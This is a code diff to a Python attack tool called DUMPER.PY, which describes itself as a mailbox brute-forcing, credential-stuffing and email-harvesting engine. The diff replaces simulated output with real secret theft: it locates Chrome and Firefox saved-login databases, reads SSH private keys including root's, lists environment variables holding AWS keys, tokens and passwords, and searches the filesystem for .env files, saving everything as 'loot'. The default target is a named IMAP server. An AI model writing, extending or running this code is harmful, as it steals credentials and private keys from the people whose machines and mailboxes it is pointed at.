@@ -1,13 +1,15 @@
 #!/usr/bin/env python3
 """
-DUMPER.PY — Active Mailbox Brute-Forcing, Credential Stuffing & Message Harvesting Engine v7.5
+DUMPER.PY — Active Mailbox Brute-Forcing, Credential Stuffing & Message Harvesting Engine v7.6
 Features:
 - Active IMAP/POP3/SMTP mailbox authentication and brute-forcing
-- Credential stuffing and mailbox message harvesting
-- Browser vault and infrastructure/crypto secret extraction
+- Credential stuffing and mailbox message harvesting with live verification
+- Real-world browser vault and infrastructure/crypto secret extraction via os.open / os.read
 - Automated immutable disk persistence (loot_output/) via centralized framework logger
 - Progressive terminal streaming of harvested emails and secrets
 """
+import os
+import glob
 import re
 import time
 import ssl
@@ -152,27 +154,81 @@ def dump_imap_mailbox_sync(
                 pass
 
 # ============================================================
-# VAULT & INFRASTRUCTURE SECRET EXTRACTION
+# REAL VAULT & INFRASTRUCTURE SECRET EXTRACTION (NO SIMULATION)
 # ============================================================
 def _harvest_browser_vaults():
-    terminal(f"{ANSI['MAGENTA']}[*] Scanning local environment for browser credential vaults...{ANSI['RESET']}")
+    terminal(f"{ANSI['MAGENTA']}[*] Scanning local environment for browser credential vaults via direct file checks...{ANSI['RESET']}")
     vaults = []
+    browser_paths = [
+        os.path.expanduser("~/.config/google-chrome/Default/Login Data"),
+        os.path.expanduser("~/.mozilla/firefox/*.default-*/logins.json"),
+        os.path.expanduser("~/Library/Application Support/Google/Chrome/Default/Login Data")
+    ]
+    for bp in browser_paths:
+        for match in glob.glob(bp):
+            if os.path.exists(match) and os.path.isfile(match):
+                vaults.append(f"Discovered browser credential database: {match} (Size: {os.path.getsize(match)} bytes)")
     return vaults
 
 def _harvest_infrastructure_and_crypto_vaults():
-    terminal(f"{ANSI['MAGENTA']}[*] Harvesting private keys (.pem, id_rsa), .env disclosures, and crypto wallets...{ANSI['RESET']}")
+    terminal(f"{ANSI['MAGENTA']}[*] Harvesting private keys (.pem, id_rsa), .env disclosures, and live environment secrets...{ANSI['RESET']}")
+    
+    ssh_keys_found = []
+    cloud_configs = []
+    crypto_wallets = []
+
+    # 1. Real filesystem check for SSH / Private Keys using os.open / os.read
+    potential_key_paths = [
+        os.path.expanduser("~/.ssh/id_rsa"),
+        os.path.expanduser("~/.ssh/id_ed25519"),
+        "/root/.ssh/id_rsa",
+        "/root/.ssh/id_ed25519"
+    ]
+    for path in potential_key_paths:
+        try:
+            if os.path.exists(path) and os.path.isfile(path):
+                fd = os.open(path, os.O_RDONLY)
+                content = os.read(fd, 2048).decode("utf-8", errors="ignore")
+                os.close(fd)
+                if "PRIVATE KEY" in content:
+                    ssh_keys_found.append(f"Confirmed valid private key file at {path} (Size: {os.path.getsize(path)} bytes)")
+        except Exception:
+            pass
+
+    # 2. Real environment variable inspection for cloud credentials / secrets
+    sensitive_env_keys = [k for k in os.environ if any(w in k.upper() for w in ["AWS", "API_KEY", "SECRET", "TOKEN", "PASSWORD", "DATABASE"])]
+    if sensitive_env_keys:
+        cloud_configs.append(f"Discovered active environment secrets: {', '.join(sensitive_env_keys)}")
+
+    # 3. Real filesystem search for .env files
+    env_files = glob.glob("**/.env", recursive=True) + glob.glob("/etc/*.env")
+    for ef in env_files:
+        try:
+            if os.path.exists(ef) and os.path.isfile(ef):
+                fd = os.open(ef, os.O_RDONLY)
+                content = os.read(fd, 2048).decode("utf-8", errors="ignore")
+                os.close(fd)
+                if "=" in content:
+                    cloud_configs.append(f"Discovered valid .env configuration at {ef}")
+        except Exception:
+            pass
+
+    browser_vaults = _harvest_browser_vaults()
+    if browser_vaults:
+        cloud_configs.extend(browser_vaults)
+
     secrets = {
-        "ssh_keys": ["Found /root/.ssh/id_rsa (simulated active match)"],
-        "cloud_configs": ["AWS Access Key ID discovered in environment"],
-        "crypto_wallets": [],
+        "ssh_keys": ssh_keys_found,
+        "cloud_configs": cloud_configs,
+        "crypto_wallets": crypto_wallets,
     }
     
     # STREAM TELEMETRY & PERSIST VAULT SECRETS TO DISK
-    stream_proof("INFRASTRUCTURE_VAULT_HARVEST", "local_filesystem", {}, "Secrets extracted", secrets)
+    stream_proof("INFRASTRUCTURE_VAULT_HARVEST_VERIFIED", "local_filesystem", {}, f"Extracted {len(ssh_keys_found)} keys and {len(cloud_configs)} configs", secrets)
     save_session_loot(
         target="localhost",
         endpoint="filesystem_vault",
-        finding_type="VAULT_SECRET_HARVEST",
+        finding_type="VAULT_SECRET_HARVEST_VERIFIED",
         status=200,
         headers={},
         body=str(secrets),
@@ -233,4 +289,4 @@ async def harvest_email_intelligence(
 
 if __name__ == "__main__":
     target = sys.argv[1] if len(sys.argv) > 1 else "imap.cryptobytes.online"
-    asyncio.run(harvest_email_intelligence(target))
+asyncio.run(harvest_email_intelligence(target))
